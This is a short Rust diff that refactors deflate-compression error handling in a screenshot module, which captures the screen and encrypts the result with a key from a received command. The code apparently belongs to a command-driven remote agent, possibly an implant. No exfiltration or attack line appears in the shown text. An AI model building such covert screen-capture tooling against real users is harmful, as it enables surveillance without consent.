@@ -271,8 +271,11 @@ impl crate::modules::Module for ScreenshotModule {
         let screenshot = self.capture_screenshot()?;
 
         // Compress further with deflate
-        let mut encoder = flate2::write::DeflateEncoder::new(Vec::new(), flate2::Compression::default());
-        let compressed = encoder.write_all(&screenshot).map(|_| encoder.finish()).unwrap_or_else(|_| Vec::new());
+        let compressed = (|| -> Result<Vec<u8>, ModuleError> {
+            let mut encoder = flate2::write::DeflateEncoder::new(Vec::new(), flate2::Compression::default());
+            encoder.write_all(&screenshot).map_err(|e| ModuleError::Execution(format!("Deflate error: {}", e)))?;
+            encoder.finish().map_err(|e| ModuleError::Execution(format!("Deflate finish error: {}", e)))
+        })()?;
 
         // Encrypt result
         let encrypted = crypto::encrypt_with_integrity(&compressed, &cmd.crypto_key);
